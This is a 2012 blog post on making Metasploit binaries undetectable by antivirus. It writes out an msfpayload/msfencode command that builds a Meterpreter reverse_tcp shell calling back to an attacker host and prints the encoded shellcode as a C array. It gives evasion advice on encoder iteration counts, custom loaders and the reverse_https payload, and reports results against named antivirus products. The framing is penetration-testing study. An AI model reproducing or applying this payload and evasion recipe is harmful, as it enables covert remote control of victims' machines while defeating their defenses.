---
layout: post
title: How to Actually Make a Metasploit Binary Undetectable
date: '2012-08-11T18:21:00.001-06:00'
author: JM
tags:
- shellcode
- encoding
- undetectable
- av bypass
- anti-virus bypass
- meterpreter
- metasploit
modified_time: '2012-12-03T01:52:15.208-07:00'
blogger_id: tag:blogger.com,1999:blog-4063990595241430327.post-8740081796607657743
blogger_orig_url: http://www.pwnage.io/2012/08/how-to-really-make-metasploit-binary.html
---

# In the beginning...
Over the past while I have been reading the Metasploit - Penetration Tester's guide. This has consisted of a number of techniques to make a binary executable undetectable to anti-virus engines using a number of techniques within the Metasploit framework. Well guess what, none of them work! (Anymore, that is). Obviously this is not the author's faults, they even made note of it in the book that with publication of these techniques most anti-virus engines would indeed take these into consideration and make all of them detectable. Through my testing, I found that pretty much all of these techniques were/are indeed detected by most major anti-virus programs.

# Looking for Answers
So like any other person, I want to get these things undetectable so I can use them without setting any alarms off, and having AVs ruin my day. Oh, and just to note, at the time of this blog post my findings were that these were undetectable, but knowing AV companies, this probably won't last long. So you guys will probably have to do some work after this. Oh, and this is not a tutorial on setting up the binaries exactly with Metasploit, go read that on [Metasploit Unleashed](http://www.offensive-security.com/metasploit-unleashed/Main_Page) I just wanted to provide this to the public to document my findings.
So, starting off I went looking, basically everything was saying the exact same things as Metasploit Unleashed and the Metasploit - Penetration Tester's guide. I found a few good resources like [here](http://www.whenisfive.com/2011/12/12/creating-custom-meterpreter-exe-templates-to-bypass-windows-av/) and [here](http://www.blogger.com/blogger.g?blogID=4063990595241430327) but for the most part I found that the things that were causing AV detection is the deployment method that Metasploit uses when executing the payload at runtime. This is fairly intuitive of the AV companies since otherwise the payload would not be detectable since it is being encoded dynamically with something like shikata_ga_nai which is a polymorphic encoder provided by msfencode.

# So what now?
Well, how would you approach it? Give it a thought before continuing to the next paragraph...

It may be fairly obvious or may not be (I tend to hate it when texts tell me things are trivial or are obvious when they are not to me, it tends to makes me feel dumb. I will never try to bring anyone down with my writings.) Basically a strategy can be taken to write your own deployment method. Msfpayload and msfencode provide a way of outputting raw shellcode like so: 

`root@bt~# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=7777 R | ./msfencode -c 1 -e x86/shikata_ga_nai -t c -o payload.c`

So what this will do is output some c code, just an unsigned char array of the meterpreter shellcode:

```
unsigned char buf[] = 
"\xbf\x41\xe8\xf8\x00\xda\xcb\xd9\x74\x24\xf4\x5a\x33\xc9\xb1" "\x49\x31\x7a\x14\x03\x7a\x14\x83\xea\xfc\xa3\x1d\x04\xe8\xaa" "\xde\xf5\xe9\xcc\x57\x10\xd8\xde\x0c\x50\x49\xee\x47\x34\x62" "\x85\x0a\xad\xf1\xeb\x82\xc2\xb2\x41\xf5\xed\x43\x64\x39\xa1" "\x80\xe7\xc5\xb8\xd4\xc7\xf4\x72\x29\x06\x30\x6e\xc2\x5a\xe9" "\xe4\x71\x4a\x9e\xb9\x49\x6b\x70\xb6\xf2\x13\xf5\x09\x86\xa9" "\xf4\x59\x37\xa6\xbf\x41\x33\xe0\x1f\x73\x90\xf3\x5c\x3a\x9d" "\xc7\x17\xbd\x77\x16\xd7\x8f\xb7\xf4\xe6\x3f\x3a\x05\x2e\x87" "\xa5\x70\x44\xfb\x58\x82\x9f\x81\x86\x07\x02\x21\x4c\xbf\xe6" "\xd3\x81\x59\x6c\xdf\x6e\x2e\x2a\xfc\x71\xe3\x40\xf8\xfa\x02" "\x87\x88\xb9\x20\x03\xd0\x1a\x49\x12\xbc\xcd\x76\x44\x18\xb1" "\xd2\x0e\x8b\xa6\x64\x4d\xc4\x0b\x5a\x6e\x14\x04\xed\x1d\x26" "\x8b\x45\x8a\x0a\x44\x43\x4d\x6c\x7f\x33\xc1\x93\x80\x43\xcb" "\x57\xd4\x13\x63\x71\x55\xf8\x73\x7e\x80\xae\x23\xd0\x7b\x0e" "\x94\x90\x2b\xe6\xfe\x1e\x13\x16\x01\xf5\x3c\xbc\xfb\x9e\x82" "\xe8\x05\x5a\x6b\xea\x05\x7a\x0a\x63\xe3\xe8\xdc\x25\xbb\x84" "\x45\x6c\x37\x34\x89\xbb\x3d\x76\x01\x4f\xc1\x39\xe2\x3a\xd1" "\xae\x02\x71\x8b\x79\x1c\xac\xa6\x85\x88\x4a\x61\xd1\x24\x50" "\x54\x15\xeb\xab\xb3\x2d\x22\x39\x7c\x5a\x4b\xad\x7c\x9a\x1d" "\xa7\x7c\xf2\xf9\x93\x2e\xe7\x05\x0e\x43\xb4\x93\xb0\x32\x68" "\x33\xd8\xb8\x57\x73\x47\x42\xb2\x85\xb4\x95\xfb\x03\xcc\x93" 
"\xef\xcf";
```

Now, an important segment is the number of iterations. I used a high number of iterations of shikata_ga_nai when using the reverse_tcp payload which resulted in the shellcode itself being undetectable, however, a large payload size. (Isn't too big of a deal since this is a standalone binary). This can be adjusted with the -c flag. Don't overdue it though! I found that if I went as high as 25 (yes, at that point I was getting impatient) it will break the binary (well, I wasn't receiving a connection back). The encoding in the first place is important in order to have the payload undetectable, but now since we just have raw shellcode output we need to execute it somehow right? I'll leave the next step up to you. Simply find a way to execute that shellcode output and you will have a UD binary. Make it unique, maybe even add code around it to make it more complex. You'll want to find a way to execute the payload in c (or another language, in that case you should output a different format with the -t flag) and compile the program, then boom, done!

# UD is the Way to Be
With the method I previously stated I got the following result (with the reverse_tcp meterpreter): 

![](https://p.twimg.com/At9OxFLCMAEaAy9.png:large)

At the time I was trying to bypass AVG, which was one of the 4 detected. I found that when I used windows/meterpreter/reverse_https I was able to bypass AVG, which presumably means, that it was undetectable to everything else. At this stage I believe that this is due to the payload being staged but I am not completely sure.

Anyways, that's it for now. Just throw a message in the comments if you have any further questions. I won't spoon feed you the last step because it should be unique, and it will help you learn :

Update:
Here's a straight forward approach that I found. I haven't done it myself but looks fairly promising:
[http://www.exploit-db.com/wp-content/themes/exploit/docs/20420.pdf](http://www.exploit-db.com/wp-content/themes/exploit/docs/20420.pdf)

~Josh
